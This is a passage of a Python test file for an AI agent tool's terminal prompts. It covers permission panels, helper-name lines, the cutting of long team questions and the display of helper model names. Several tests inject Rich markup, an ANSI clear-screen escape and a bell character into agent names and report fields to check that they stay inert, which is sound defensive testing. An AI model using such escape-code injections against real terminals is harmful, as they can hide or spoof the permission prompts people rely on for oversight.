        assert not any(line.startswith(("Action:", "Allow?")) for line in lines)
        assert "  Action: Run shell" in lines and "  Allow? [y/N]" in lines

    def test_a_very_long_question_is_cut_with_a_marker(self):
        screen, out = self.screen()
        screen.team_question("\n".join(f"line {n}" for n in range(30)))
        lines = out.getvalue().splitlines()
        assert len(lines) == 13 and "line 11" in lines[11] and "line 12" not in out.getvalue()
        assert lines[-1].strip() == "... 18 more lines"

    def test_one_huge_question_is_cut_so_it_cannot_wrap_into_something_else(self):
        screen, out = self.screen()
        screen.team_question("Which? " + "word " * 1000)
        text = out.getvalue()
        assert "... (cut)" in text and len(text) < 2500

    def test_an_empty_report_is_marked(self):
        screen, out = self.screen()
        screen.team_result("explorer", True, "")
        screen.team_result("coder", True, None)
        assert out.getvalue().count("(no report)") == 2

    def test_markup_and_escape_codes_in_team_text_stay_inert(self):
        screen, out = self.screen()
        hostile = "[red]boom[/red] \x1b[2J \x07"
        screen.team_plan([{"agent": hostile, "query": hostile}])
        screen.team_dispatch(hostile, hostile)
        screen.team_result(hostile, False, hostile)
        screen.helper_call(hostile, hostile, {"path": hostile})
        screen.team_question(hostile)
        text = out.getvalue()
        assert "[red]boom[/red]" in text            # printed as text, not read as markup
        assert "\x1b" not in text and "\x07" not in text

    def test_odd_arguments_never_raise(self):
        screen, _ = self.screen()
        screen.team_plan(None)
        screen.team_plan([None, 5, {"agent": None}])
        screen.helper_call(None, None, None)
        screen.team_result(None, True, None)


class TestHelperLineInThePrompt:
    def ask(self, helper, kind="edit", tool="write_file", args=None):
        out = io.StringIO()
        ask = make_asker(Console(file=out, width=100, force_terminal=False, color_system=None),
                         lambda prompt="": "y", Path("."), helper=helper)
        request = Request(tool=tool, kind=kind, subject="notes.txt",
                          args=args or {"path": "notes.txt", "content": "hi", "if_exists": "refuse"},
                          remember=False, grant="")
        ask(request)
        return out.getvalue()

    def test_the_panel_names_the_helper_that_is_asking(self):
        text = self.ask(lambda: "coder")
        assert "Helper: coder" in text and text.index("Action:") < text.index("Helper:")

    def test_no_helper_line_outside_a_team_job(self):
        assert "Helper:" not in self.ask(lambda: "")
        assert "Helper:" not in self.ask(None)

    def test_a_helper_name_with_escape_codes_is_defused(self):
        text = self.ask(lambda: "co\x1b[2Jder")
        assert "\x1b" not in text and "Helper: co" in text

    def test_a_blank_helper_name_prints_no_helper_line(self):
        assert "Helper:" not in self.ask(lambda: "   \n ")

    def test_the_helper_name_is_trimmed_and_cut(self):
        trimmed = self.ask(lambda: "  coder  ")
        assert "Helper: coder" in trimmed and "Helper:  coder" not in trimmed
        long = squash(self.ask(lambda: "x" * 300))
        assert "x" * 109 + "…" in long and "x" * 111 not in long

    def test_a_role_at_model_helper_name_is_shown_whole(self):
        name = "explorer@claude-sonnet-4-5-20250929"
        assert len(name) > 30
        assert squash(name) in squash(self.ask(lambda: name))

    def test_a_team_request_prints_no_subject_line(self):
        text = self.ask(None, kind="team", tool="start_team_job",
                        args={"task": "Survey the project", "why": "big"})
        assert "Survey the project" in text and "Subject:" not in text


def team_request_for_ui():
    return Request(tool="start_team_job", kind="team", subject="Survey", args={"task": "Survey", "why": ""},
                   remember=False, grant="")


class TestHelperModelsLine:
    def test_the_team_panel_shows_the_line(self, tmp_path):
        c, out = console()
        make_asker(c, lines("y"), tmp_path,
                   helper_models=lambda: "Helper models: claude-sonnet-5-5 (chat), gpt-5.5")(team_request_for_ui())
        assert "Helper models: claude-sonnet-5-5 (chat), gpt-5.5" in out.getvalue()

    def test_markup_in_a_model_name_is_printed_literally(self, tmp_path):
        c, out = console()
        make_asker(c, lines("y"), tmp_path,
                   helper_models=lambda: "Helper models: x (chat), [red]evil[/red]\x1b[2J")(team_request_for_ui())
        assert "[red]evil[/red]" in out.getvalue() and "\x1b" not in out.getvalue()

    def test_a_failing_line_source_gives_no_line_and_still_asks(self, tmp_path):
        c, out = console()

        def broken():
            raise RuntimeError("boom")

        answer = make_asker(c, lines("y"), tmp_path, helper_models=broken)(team_request_for_ui())
        assert answer.choice == "y" and "Helper models" not in out.getvalue()

    def test_other_tools_never_call_the_line_source(self, tmp_path):
        c, _ = console()
        called = []
        make_asker(c, lines("y"), tmp_path, helper_models=lambda: called.append(1) or "x")(edit_request())
        assert called == []
